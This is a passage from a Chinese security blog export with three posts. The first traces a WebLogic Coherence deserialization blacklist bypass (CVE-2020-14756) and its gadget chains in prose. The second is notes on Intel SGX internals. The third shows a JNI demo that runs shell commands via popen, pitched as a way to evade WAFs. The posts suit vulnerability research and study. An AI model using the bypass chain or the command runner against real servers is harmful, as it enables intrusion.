<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">com.oracle.common.internal.util.Histogram</span><br><span class="line">com.tangosol.util.MapSet</span><br><span class="line">com.tangosol.util.Binary</span><br><span class="line">com.tangosol.util.LiteSet</span><br><span class="line">com.tangosol.util.UUID</span><br><span class="line">com.tangosol.util.LiteMap</span><br><span class="line">com.tangosol.run.xml.SimpleDocument</span><br><span class="line">com.tangosol.run.xml.XmlBean</span><br><span class="line">com.tangosol.util.ConcurrentMap$1</span><br><span class="line">com.tangosol.coherence.component.net.Member</span><br><span class="line">com.tangosol.net.security.PermissionInfo</span><br><span class="line">com.tangosol.coherence.mvel2.util.FastList</span><br></pre></td></tr></table></figure>
<p>数量不是很多，一个一个手工看。很快啊，我啪一下就点到com.oracle.common.internal.util.Histogram#readExternal(java.io.ObjectInput)里面了。<br>
<img src="image-20201122163616331.png" alt="image-20201122163616331.png"><br>
这个地方有强制类型转换，那么刚才的链路不就续上了？<br>
继续跟进，再一次失望，发现这里只读取长整型，并没有调用readObject。<br>
<img src="image-20201122163730081.png" alt="image-20201122163730081.png"></p>
<p>然后接下来的所有类要么是转换成了DataInput但是没有readObject。要么是根本就没有强制转换。</p>
<p>还是不甘心，又看了一遍，在com.tangosol.net.security.PermissionInfo#readExternal(java.io.ObjectInput)处事情出现转机。<br>
<img src="image-20201122164228358.png" alt="image-20201122164228358.png"><br>
我发现在调用readCollection的时候传入的ObjectInput in会被隐式转换成DataInput in，并且里面刚好有readObject。<br>
<img src="image-20201122164413735.png" alt="image-20201122164413735.png"></p>
<p>到这里一条从readExternal(java.io.ObjectInput) 到无视黑名单的反序列化路线在理论上似乎已打通，接下来的就是gadget后半段是选择，立马想到的是TemplatesImpl和RemoteConstructor（CVE-2020-14644）。我选择了后者，把payload构造好，再打上10月补丁（感谢给我补丁的师傅）一发入魂。</p>
<p>ps：这里readExternal(java.io.ObjectInput) -&gt; 无视黑名单的readObject的结论是不严谨的，选择TemplatesImpl也是打不通的，这个原因后面会解释。确实很尴尬，虽然能RCE，但是当时急于验证并未全流程调试过，对这个洞的理解比较片面。</p>
<p>至此第一个洞就结束了，当晚就给官方提漏洞。后面的几天我在反思这个洞，</p>
<ol>
<li>为什么我能挖到？我想我能挖到原因是<s>weblogic官方没有bug bounty</s>前人可能没有注意到有进入到readExternal(DataInput in)通路。</li>
<li>为什么readExternal(ObjectInput in)可以续上？我想因为readExternal本来就是给程序员自定义反序列化数据的地方，而readExternal(DataInput in)里面是coherence自己的反序列化逻辑，所以从ObjectInput in能到DataInput in算是题中应有之义。</li>
<li>这种反序列化绕过方式属于哪种类型？我想应该是二阶反序列化类型。</li>
</ol>
<h2 id="CASE-2">CASE 2</h2>
<p>几天后，我收到了官方回复的邮件，从它们回复中可以看到它们把这个链关键认定为RCE involving LambdaIdentity。此时，我觉得很奇怪难道后半段不是可以灵活吗？如果我重新找一个新入口配上7u21后半段岂不是能再混一个CVE？。然后抓了一下整个coherence lib目录下的所有jar包的readExternal(java.io.ObjectInput) 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">com.oracle.common.internal.util.Histogram</span><br><span class="line">com.tangosol.util.MapSet</span><br><span class="line">com.tangosol.util.Binary</span><br><span class="line">com.tangosol.util.LiteSet</span><br><span class="line">com.tangosol.util.UUID</span><br><span class="line">com.tangosol.util.LiteMap</span><br><span class="line">com.tangosol.run.xml.SimpleDocument</span><br><span class="line">com.tangosol.run.xml.XmlBean</span><br><span class="line">com.tangosol.util.ConcurrentMap$1</span><br><span class="line">com.tangosol.coherence.component.net.Member</span><br><span class="line">com.tangosol.net.security.PermissionInfo</span><br><span class="line">com.tangosol.coherence.mvel2.util.FastList</span><br><span class="line">com.tangosol.coherence.servlet.AbstractHttpSessionModel</span><br><span class="line">com.tangosol.coherence.servlet.AttributeHolder</span><br></pre></td></tr></table></figure>
<p>倒数两个是比上次只跑conherence.jar多出来的，经过验证在conherence-web.jar中的com.tangosol.coherence.servlet.AttributeHolder满足条件。<br>
<img src="image-20201122174447449.png" alt="image-20201122174447449.png"><br>
把TemplatesImpl打到m_Value之后，发送payload后发现控制台报错。发生肾么事了？我一看，哦原来啊是没过黑名单，这就引起了对这个漏洞细节的进一步探究。<br>
<img src="image-20201122191637309.png" alt="image-20201122191637309.png"><br>
在com.tangosol.util.ExternalizableHelper#readObjectInternal下断点可以看到它并没进入，预期的readExternalizableLite而是进入了readSerializable中<br>
<img src="image-20201122192730759.png" alt="image-20201122192730759.png"><br>
在readObject中DataInput in会重新“转换”回带黑名单的InputStream，所以失败。<br>
<img src="image-20201122192854446.png" alt="image-20201122192854446.png"><br>
此时，心理又有两个疑问</p>
<ol>
<li>输入流为我所控，那我把nType改成10，强行进入readExternalizableLite行不行？</li>
<li>为什么RemoteConstructor可以打成功？</li>
</ol>
<p>首先回答第一个问题，可以但是行不通，就算真的把TemplatesImpl new出来了之后的强转也过不了。<br>
<img src="image-20201122193516298.png" alt="image-20201122193516298.png"><br>
其次，就算真的成功他也没有readExternal方法（即没有实现ExternalizableLite接口）。<br>
<img src="image-20201122193856818.png" alt="image-20201122193856818.png"><br>
到这里RemoteConstructor可以打的原因也很明显了RemoteConstructor实现了ExternalizableLite接口。<br>
<img src="image-20201122194211848.png" alt="image-20201122194211848.png"><br>
所以这个攻击面的利用条件是：</p>
<ol>
<li>一个java.io.ObjectInput强转成java.io.DataInput的点</li>
<li>强转成java.io.DataInput后需要有进行ExternalizableHelper.readObject的操作</li>
<li>一个实现了ExternalizableLite的接口高危类</li>
</ol>
<p>不过这已经足够了，因为conherence里面的Extractor都实现这个接口。<br>
<img src="image-20201122195930855.png" alt="image-20201122195930855.png"></p>
<p>一开始，我其实是想手工挖的，那段时间真的是看的我头皮发麻，而且因为实现了ExternalizableLite接口是在是太多也很难保证自己完全不重不漏，大多数readExternal里面都只有赋值没有别的操作，休息了几天后我决定用魔法打败魔法，拿之前写的自动化工具跑。结合历史漏洞我决定以readExternal(DataInput in)为source，以com.tangosol.util.extractor.AbstractExtractor#compare为sink开动化跑。</p>
<p>跑了一会，从一堆误报中看到了希望的曙光。<br>
<img src="image-20201122201724495.png" alt="image-20201122201724495.png"><br>
最后证明了这个确实可行。</p>
<h2 id="CASE-3">CASE 3</h2>
<p>在手工看的那段时间，虽然头皮发麻但并不是没有收获，看了几个版本的weblogic经历了“卧槽,这里怕不是有洞&quot;到&quot;卧槽,被黑名单全防住了，全防出去了啊&quot;很多次后，我隐约觉得coherence已经可以造成危害的点全部加入黑名单套餐了，不会有全新的链了（等被打脸），但二阶反序列化的点还有机会！</p>
<p>这次引起我注意的是com.tangosol.coherence.jcache.common.CoherenceEntryProcessorResult。可以看到在反序列化时它会读一个Binary进来，然后对Binary进行一个fromBinary的操作。<br>
<img src="image-20201123175647803.png" alt="image-20201123175647803.png"><br>
我注意到com.tangosol.util.ExternalizableHelper#fromByteArray中会把byte[]数组重建成BufferInput进行反序列化，因为重建所以没有黑名单过滤。<br>
<img src="image-20201123195621071.png" alt="image-20201123195621071.png"><br>
<img src="image-20201123195720598.png" alt="image-20201123195720598.png"></p>
<p>这个时候，我感觉又成了。构造好payload打过去，被weblogic防出去了。一看，是2找不到类，后面确认了一下，这个类在coherence-jcahe.jar里面，这个包并没有被weblogic加载进来。<br>
<img src="image-20201123202848977.png" alt="image-20201123202848977.png"><br>
但是就这么放弃是不可能的，我决定找到其他fromBinary的调用点，这里我选择直接打开JD-GUI搜，发现SimpleBinaryEntry这个看起来品相很好，它的getValue调用了ExternalizableHelper.fromBinary方法而其toString方法又调用了getValue。<br>
<img src="image-20201122203856852.png" alt="image-20201122203856852.png"><br>
<img src="image-20201122203911099.png" alt="image-20201122203911099.png"></p>
<p>这里还有细节需要注意m_serializer是transient的，如果用BadAttributeValueExpException.readObject() -&gt; TiedMapEntry.toString()是不可行的，后续反序列化会因为m_serializer为null而失败。</p>
<p>所以这里还是需要以readExternal为入口进来，~~因为readExternal是不受transient限制的。~~因为走这种反序列化当对象实现了SerializerAware时会自动插入serializer。<br>
<img src="image.png" alt="image.png"></p>
<p><img src="image-20201123210123344.png" alt="image-20201123210123344.png"></p>
<p>半自动化跑了一下，虽然没有绝对跑出来（没有用指针分析），但是有一个参考已经足够了：<br>
<img src="image-20201126145458994.png" alt="image-20201126145458994.png"></p>
<h2 id="小结">小结</h2>
<p>总结一下trik</p>
<ul>
<li>在挖新的之前，可以<a href="http://redteam.today/2020/03/25/weblogic%E5%8E%86%E5%8F%B2T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81%E6%A2%B3%E7%90%86/">调研历史CVE和补丁学习前人思路</a>。</li>
<li>找二阶反序列化，二阶反序列化往往出现在readExternal处。二阶反序列化，既可以是标准的Byte字节流型（CVE-2016-0638），也可以是jrmp带外利用（CVE-2017-3248），还可以是一些变种比如这里的cve-2020-14756开发自实现的反序列化，甚至可以是开发在反序列化时使用了自己继承的ObjectInputStream里面但是里面重写readResolve方法（覆盖了原来的黑名单检查）。</li>
<li>自动化</li>
</ul>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>Intel SGX（Software Guard Extensions）速记</title>
    <url>/2024/12/01/Intel-SGX%EF%BC%88Software-Guard-Extensions%EF%BC%89%E9%80%9F%E8%AE%B0/</url>
    <content><![CDATA[<h1>SGX的作用</h1>
<blockquote>
<p>SGX使得应用程序在一段位于Enclave地址空间中能够开辟一段受保护的内存空间。这段受保护空间实行严格的访问控制和加密操作来提供对程序数据机密性和代码完整性的保护，使得即使是Hypervisor、BIOS，操作系统等特权应用都不能随意访问这段地址空间</p>
</blockquote>
<h1>SGX的启用</h1>
<blockquote>
<p>SGX support can be checked by executing the CPUID instruction with the <em>Structured Extended Feature Leaf</em> flag set, and checking if the second bit of the EBX register is set. To be able to use SGX, it must have been enabled by BIOS, and only a few BIOSes actually support this technology. That is one of the reasons it is not widely used.</p>
</blockquote>
<h1>Enclave</h1>
<p>在Intel SGX（Software Guard Extensions）中，Enclave是一个受硬件保护的安全执行环境（Trusted Execution Environment, TEE）。Enclave是一个运行环境的概念，但它也可以被视为一个程序实体的逻辑单元，因为它承载了特定的代码和数据，并在运行时提供隔离和保护。</p>
<p>程序在编译时会被被分为non-secure和secure part (运行在enclave中)。当调用enclave function时，程序会进入enclave环境，只有enclave中的代码可以访问enclave中数据。</p>
<p><img src="image1.png" alt=""></p>
<p><img src="image2.png" alt=""></p>
<p>一个代码的例子</p>
<p><img src="image3.png" alt=""></p>
<h1>INTEL SGX指令</h1>
<p>ring0支持左边8个指令，ring3支持右边五个指令。</p>
<p><img src="image4.png" alt=""></p>
<h1>内存中的关键概念</h1>
<p><img src="image5.png" alt=""></p>
<h2 id="PRM-Preserved-Random-Memory">PRM (Preserved Random Memory)</h2>
<ul>
<li>是DRAM中一段连续的保留内存区域</li>
<li>位于最低的BIOS层</li>
<li>不能被任何普通软件直接访问</li>
</ul>
<h2 id="EPC-Enclave-Page-Cache">EPC (Enclave Page Cache)</h2>
<ul>
<li>是PRM中的一部分</li>
<li>由操作系统负责分配</li>
<li>是4KB大小的内存页面组成的集合</li>
<li>用于存储Enclave的代码和数据</li>
<li>内存会被<em>Memory Encryption Engine</em>加密。只有在物理CPU中才会被解密。加密的密钥在boot time时被生成并存储在CPU中。</li>
</ul>
<p><img src="image6.png" alt=""></p>
<h2 id="EPCM-Enclave-Page-Cache-Map">EPCM  (Enclave Page Cache Map)</h2>
<ul>
<li>EPCM不存储在EPC或PRM中，EPCM是一个硬件级的数据结构。存储在处理器的专用存储区域中（例如，处理器内部的寄存器或缓存中）</li>
<li>EPCM在处理器内部，软件（ <strong>包括Enclave代码</strong> 、操作系统）都无法直接访问。</li>
<li>EPCM是一个硬件维护的表，用于记录EPC中每个页面的元数据（metadata）。</li>
<li>它跟踪EPC页面的分配状态、所属Enclave、页面类型（如代码页、数据页、TCS页等）以及访问权限。</li>
</ul>
<p>EPCM结构体</p>
<p><img src="image7.png" alt=""></p>
<ul>
<li>
<p>VALID：</p>
<ul>
<li>标志页面是否已分配。</li>
<li>如果为<code>0</code>，表示该页面未被分配。</li>
</ul>
</li>
<li>
<p>PT（Page Type）：</p>
<ul>
<li>
<p>指定页面的类型，例如：</p>
<ul>
<li><code>PT_REG</code>：普通数据或代码页面。</li>
<li><code>PT_SECS</code>：SECS页面。</li>
<li><code>PT_TCS</code>：线程控制结构（TCS）页面。</li>
</ul>
</li>
</ul>
</li>
<li>
<p>ENCLAVESECS：</p>
<ul>
<li>标识页面所属的Enclave。</li>
<li>确保页面只能被其所属的Enclave访问，防止跨Enclave的非法访问。</li>
</ul>
</li>
<li>
<p>ADDRESS：</p>
<ul>
<li>页面对应的虚拟地址，用于访问该页面。</li>
</ul>
</li>
<li>
<p>R/W/X（权限位）：</p>
<ul>
<li>
<p>控制页面的访问权限：</p>
<ul>
<li><code>R</code>：允许Enclave代码读取页面。</li>
<li><code>W</code>：允许Enclave代码写入页面。</li>
<li><code>X</code>：允许在页面中执行代码。</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>单个PRM中只有一个EPC区域：</p>
<ul>
<li>PRM中的一部分被划分为EPC，用于存储Enclave的页面（代码和数据）。</li>
<li>EPC是一个连续的内存区域，其大小由硬件和BIOS配置决定（通常是128MB，但可能更小或更大，具体取决于处理器型号和系统配置）。</li>
<li>换句话说，PRM中只有一个EPC区域，而不是多个EPC。</li>
<li>多个Enclave的页面会被分配到同一个EPC区域中，但硬件确保它们之间的隔离和安全性。(EPCM确保)</li>
<li>每个Enclave需要占用一定数量的EPC页面。如果EPC空间不足，系统可能会通过SGX的换页机制（paging）将部分EPC页面换出到普通内存中。</li>
</ul>
<h2 id="SECS-SGX-Enclave-Control-Structure">SECS (SGX Enclave Control Structure)</h2>
<p><strong>一个Enclave对应一个SECS</strong></p>
<ul>
<li>
<p>SECS的作用：</p>
<ul>
<li>
<p>SECS是每个Enclave的核心元数据结构，存储了Enclave的关键信息，包括：</p>
<ul>
<li>密码学测度（Measurement）：用于认证Enclave的完整性。</li>
<li>Enclave的身份信息：如Enclave的创建参数、大小、属性等。</li>
</ul>
</li>
<li>
<p>SECS是EPC中的一个页面，但它受到严格的硬件保护， <strong>只有SGX硬件和微码可以访问和修改</strong> 。</p>
</li>
</ul>
</li>
<li>
<p>安全性要求：</p>
<ul>
<li>如果Enclave中的代码能够直接修改SECS中的数据（如密码学测度或身份信息），将破坏SGX的安全模型。</li>
<li>为此，SGX硬件通过EPCM中的权限控制字段，确保SECS页面只能由SGX硬件访问，而不能被Enclave代码或外部软件直接修改。</li>
</ul>
</li>
</ul>
<h2 id="TCS-Thread-Control-Structure">TCS (Thread Control Structure)</h2>
<p>和SECS一样，不能被其他软件包括enclave中的代码本省修改。一个enclave至少有一个，因为它为多线程而生，所以也可以有多个。</p>
<blockquote>
<p>The SGX design fully supports multi-core processors. It is possible for multiple logical processors to concurrently execute the same enclave’s code at the same time, via different threads.</p>
<p>The SGX implementation uses a Thread Control Structure (TCS) for each logical processor that executes an enclave’s code.</p>
</blockquote>
<h2 id="SSA-Save-State-Area">SSA(Save State Area)</h2>
<p>一个TCS至少有有一个SSA用于在线程因为中断或者异常退出时保存状态，在恢复时从这里面读取状态。</p>
<h2 id="Stack-and-Heap">Stack and Heap</h2>
<p>有自己的堆栈</p>
<p><img src="image8.png" alt=""></p>
<h1>Intel SGX信任根与信任链建立过程</h1>
<h2 id="一、硬件信任根初始化">一、硬件信任根初始化</h2>
<h3 id="1-Intel-SGX硬件密钥体系">1. Intel SGX硬件密钥体系</h3>
<ul>
<li>
<p>基础密钥(Root Provisioning Key和Root Seal Key)在制造时烧录到熔丝(Fuse)中</p>
</li>
<li>
<p>采用密钥派生机制(Key Derivation)生成其他功能密钥:</p>
<ul>
<li>Provisioning Key: 用于远程认证</li>
<li>Seal Key: 用于数据加密存储</li>
<li>Report Key: 用于本地报告签名</li>
<li>Launch Key: 用于Enclave启动控制</li>
</ul>
</li>
</ul>
<h3 id="2-SGX硬件可信模块">2. SGX硬件可信模块</h3>
<ul>
<li>测量引擎(Measurement Engine)</li>
<li>密钥派生引擎(Key Derivation Engine)</li>
<li>加密引擎(Encryption Engine)</li>
<li>签名验证引擎(Signature Verification Engine)</li>
<li>安全内存管理单元(Memory Management Unit)</li>
</ul>
<h2 id="二、Enclave创建与测量">二、Enclave创建与测量</h2>
<h3 id="1-Enclave代码准备">1. Enclave代码准备</h3>
<ul>
<li>开发者提供Enclave代码、数据和属性定义</li>
<li>属性包括:XFRM、MODE(DEBUG/PRODUCTION)等</li>
</ul>
<h3 id="2-硬件测量过程">2. 硬件测量过程</h3>
<ul>
<li>逐页测量:</li>
</ul>
<p>For each page:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">MRENCLAVE <span class="operator">=</span> SHA256_UPDATE(MRENCLAVE <span class="operator">||</span>  PAGE_INFO <span class="operator">||</span> PAGE_CONTENT)</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>页信息(PAGE_INFO)包含:</p>
<ul>
<li>页类型(REG/TCS/SECS)</li>
<li>页属性(R/W/X权限)</li>
<li>加载偏移地址</li>
</ul>
</li>
<li>
<p>最终生成256位的MRENCLAVE值</p>
</li>
</ul>
<h2 id="三、签名验证-SIGSTRUCT">三、签名验证(SIGSTRUCT)</h2>
<h3 id="1-开发者签名">1. 开发者签名</h3>
<ul>
<li>使用2048位RSA密钥对生成SIGSTRUCT</li>
<li>SIGSTRUCT包含:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  MRENCLAVE,</span><br><span class="line">  Attributes,</span><br><span class="line">  ISVSVN,</span><br><span class="line">  ISVPRODID,</span><br><span class="line">  DATE,</span><br><span class="line">  SIGNATURE </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-MRSIGNER生成">2. MRSIGNER生成</h3>
<ul>
<li>MRSIGNER = SHA256(RSA Public Key Modulus)</li>
<li>用于识别Enclave开发者身份</li>
</ul>
<h3 id="3-硬件验证">3. 硬件验证</h3>
<ul>
<li>验证RSA签名有效性</li>
<li>验证MRENCLAVE匹配</li>
<li>验证属性合法性</li>
</ul>
<h2 id="四、启动授权-EINITTOKEN">四、启动授权(EINITTOKEN)</h2>
<h3 id="1-Launch-Enclave职责">1. Launch Enclave职责</h3>
<ul>
<li>实现Intel定义的启动控制策略</li>
<li>管理Enclave白名单</li>
<li>生成并签署EINITTOKEN</li>
</ul>
<h3 id="2-EINITTOKEN结构">2. EINITTOKEN结构</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  MRENCLAVE,</span><br><span class="line">  MRSIGNER,</span><br><span class="line">  Attributes,</span><br><span class="line">  ISVSVN,</span><br><span class="line">  CPUSVN,</span><br><span class="line">  KEYID,</span><br><span class="line">  MAC  // 使用Launch Key计算的MAC</span><br><span class="line">&#125;=</span><br></pre></td></tr></table></figure>
<h3 id="3-授权流程">3. 授权流程</h3>
<ol>
<li>验证请求者身份(MRSIGNER)</li>
<li>检查启动策略合规性</li>
<li>使用Launch Key生成MAC</li>
<li>打包EINITTOKEN</li>
</ol>
<h2 id="五、Enclave初始化-EINIT">五、Enclave初始化(EINIT)</h2>
<h3 id="1-硬件验证">1. 硬件验证</h3>
<ul>
<li>验证EINITTOKEN的MAC</li>
<li>验证MRENCLAVE/MRSIGNER匹配</li>
<li>检查属性与策略符合性</li>
</ul>
<h3 id="2-初始化过程">2. 初始化过程</h3>
<ul>
<li>建立Enclave上下文</li>
<li>初始化TCS(Thread Control Structure)</li>
<li>设置内存访问权限</li>
<li>生成Enclave加密密钥</li>
</ul>
<h3 id="3-信任链确立">3. 信任链确立</h3>
<ul>
<li>硬件信任根 → 测量值 → 开发者签名 → 启动授权 → 运行时隔离</li>
</ul>
<p>这样的修改更准确地描述了SGX的信任根和信任链建立过程,包含了关键的技术细节。您觉得还有需要补充或修改的地方吗?</p>
<h1>防止不可信的OS地址映射攻击</h1>
<p>OS会被视作不可信环境，需要防止恶意的OS修改VA到PA的映射。</p>
<ol>
<li>
<p>The CPU performs the usual virtual-to-physical address translation using the page tables (controlled by the untrusted OS).</p>
</li>
<li>
<p>Once the physical address is determined, the CPU checks whether the physical address belongs to an EPC page by consulting the EPCM.</p>
</li>
<li>
<p>If the physical address is an EPC page, the CPU compares the virtual address being accessed with the expected virtual address stored in the EPCM entry for that EPC page.</p>
<ol>
<li>If the virtual address matches, the access is allowed.</li>
<li>If the virtual address does not match, the CPU raises an exception, and the access is denied.</li>
</ol>
</li>
</ol>
<h1>Enclave的调度</h1>
<p><img src="image9.png" alt=""></p>
<p>留给操作系统调度的指令</p>
<p><strong>EPA</strong> - This instruction allocates a 4KB memory page that will contain the pages version number array (VA) to protect against replay. Each element is 64 bits long.</p>
<p><strong>EBLOCK</strong> - This instruction blocks all accesses to the page being prepared for eviction. All future accesses to this page will result in a page fault (“page blocked”).</p>
<p><strong>ETRACK</strong> - This instruction evicts a page from the EPC. The page must have been prepared properly: it must be blocked and must not be referenced by the TLB. Before writing it into the external memory, the page is encrypted, and a version number and meta-data are generated, and a final MAC is performed.</p>
<p><strong>ELDB/ELDU</strong> - This instruction loads into memory a previously evicted page, in a blocked state or not. It checks the MAC of the meta-data, version number (from the corresponding VA entry), and the page encrypted content. If the verification succeeds, the page content is decrypted and placed inside the chosen EPC page, and the corresponding VA entry deleted.</p>
<h1>Enclave的创建</h1>
<p><img src="image10.png" alt=""></p>
<h1>Enclave的进入和退出</h1>
<p><img src="image11.png" alt=""></p>
<h1>Enclave中断和恢复</h1>
<p><img src="image12.png" alt=""></p>
<h1>Intel SGX的原生支持缺陷</h1>
<p>SGX 的原生接口（如 ECALL 和 OCALL）非常底层，无法直接支持复杂的 OS 抽象。例如，线程管理、同步原语和动态线程创建在 SGX 中没有直接支持。</p>
<p><img src="image13.png" alt=""></p>
<p>也不支持enclave之间通信。</p>
<p><img src="image14.png" alt=""></p>
<h1>参考</h1>
<p><a href="https://lingering.github.io/2020/06/18/SGX-%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/">https://lingering.github.io/2020/06/18/SGX-基本原理/</a></p>
<p><a href="https://blog.quarkslab.com/overview-of-intel-sgx-part-1-sgx-internals.html">https://blog.quarkslab.com/overview-of-intel-sgx-part-1-sgx-internals.html</a></p>
<p><a href="https://blog.quarkslab.com/overview-of-intel-sgx-part-2-sgx-externals.html">https://blog.quarkslab.com/overview-of-intel-sgx-part-2-sgx-externals.html</a></p>
<p><a href="https://www.ndss-symposium.org/wp-content/uploads/2017/09/ndss2017_07-5_Shinde_paper.pdf">https://www.ndss-symposium.org/wp-content/uploads/2017/09/ndss2017_07-5_Shinde_paper.pdf</a></p>
<p><a href="https://sgx101.gitbook.io/sgx101/sgx-bootstrap/enclave">https://sgx101.gitbook.io/sgx101/sgx-bootstrap/enclave</a></p>
]]></content>
      <categories>
        <category>binary</category>
      </categories>
      <tags>
        <tag>paper reading</tag>
        <tag>binary</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA JNI 执行命令与调试</title>
    <url>/2019/12/31/JAVA-JNI-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E4%B8%8E%E8%B0%83%E8%AF%95/</url>
    <content><![CDATA[<!-- JNI是Java Native Interface的缩写，利用它可以在比较底层的位置执行命令。 -->
<!-- more -->
<h1>JAVA JNI 执行命令与调试</h1>
<p><a name="ipGc8"></a></p>
<h2 id="执行命令">执行命令</h2>
<p>代码基本抄自自园长的demo（为了篇幅省略了作者信息，这里统一说明一下～）</p>
<p>JNI的好处在于底层，实战中可用绕过一些waf拦截吧。</p>
<p>CommandExecution.java</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommandExecution</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">static</span> native String <span class="title">exec</span><span class="params">(String cmd)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译CommandExecution，并生成native层c代码需要用的头文件</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">javac -cp . CommandExecution.java</span><br><span class="line">javah -cp . CommandExecution</span><br></pre></td></tr></table></figure>
<p>CommandExecution.cpp</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;CommandExecution.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function">JNIEXPORT jstring</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">JNICALL <span class="title">CommandExecution_exec</span></span></span><br><span class="line"><span class="function">        <span class="params">(JNIEnv *env, jclass jclass, jstring str)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (str != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        jboolean jsCopy;</span><br><span class="line">        <span class="comment">// 将jstring参数转成char指针</span></span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *cmd = env-&gt;<span class="built_in">GetStringUTFChars</span>(str, &amp;jsCopy);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用popen函数执行系统命令</span></span><br><span class="line">        FILE *fd  = <span class="built_in">popen</span>(cmd, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (fd != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="comment">// 返回结果字符串</span></span><br><span class="line">            string result;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 定义字符串数组</span></span><br><span class="line">            <span class="type">char</span> buf[<span class="number">128</span>];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 读取popen函数的执行结果</span></span><br><span class="line">            <span class="keyword">while</span> (<span class="built_in">fgets</span>(buf, <span class="built_in">sizeof</span>(buf), fd) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="comment">// 拼接读取到的结果到result</span></span><br><span class="line">                result +=buf;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 关闭popen</span></span><br><span class="line">            <span class="built_in">pclose</span>(fd);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 返回命令执行结果给Java</span></span><br><span class="line">            <span class="keyword">return</span> env-&gt;<span class="built_in">NewStringUTF</span>(result.<span class="built_in">c_str</span>());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译，注意这里为了后续能够调试需要加 <code>-g</code> 参数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">g++ -fPIC -I<span class="string">&quot;$JAVA_HOME/include&quot;</span> -I<span class="string">&quot;$JAVA_HOME/include/linux&quot;</span> -shared -g -o libcmd.so CommandExecution.cpp</span><br></pre></td></tr></table></figure>
<p>MainTest.java</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainTest</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="type">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.<span class="built_in">load</span>(<span class="string">&quot;/home/anonymous/Desktop/learnjni/libcmd.so&quot;</span>);</span><br><span class="line">        CommandExecution commandExecution = <span class="keyword">new</span> <span class="built_in">CommandExecution</span>();</span><br><span class="line">        System.out.<span class="built_in">println</span>(commandExecution.<span class="built_in">exec</span>(<span class="string">&quot;whoami&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">javac MainTest.java</span><br><span class="line">java MainTest</span><br></pre></td></tr></table></figure>
<p><img src="1577718523328-184106f3-09eb-46c1-bf96-43a560463d68.png" alt=""></p>
<p><a name="GgaID"></a></p>
<h2 id="调试">调试</h2>
<p>调试需要同时安装JetBrain家的idea和clion，并且clion要以管理员权限（sudo）启动。</p>
<ul>
<li>在调用native层的地方打断点</li>
<li>通过jps找到所运行的java类对应的类的编号</li>
<li>在clion选择Run-&gt;Attach to Process 然后attach到响应编号上</li>
<li>在下断点地方步入</li>
</ul>
<p><img src="1577718596131-2f54a43f-5d26-4aad-ae09-294069574301.png" alt=""></p>
<p>步过findNative后就会跳转到clion里面然后就可以愉快的调试了～<br /><img src="1577718822468-c0f6a1cf-2889-4539-aebe-aa0cda8fdd0a.png" alt=""><br>
<a name="0XEa5"></a></p>
<h2 id="参考">参考</h2>
<p><a href="https://www.youtube.com/watch?v=8Cjeq4l5COU">recipeNoD002 - Debugging JNI code with IntelliJ/CLion</a><br /><a href="https://www.jianshu.com/p/8c510102e879">IntellJ IDEA中JNI单步调试指南</a><br /><a href="https://javasec.org/javase/JNI/">JNI安全基础</a></p>
]]></content>
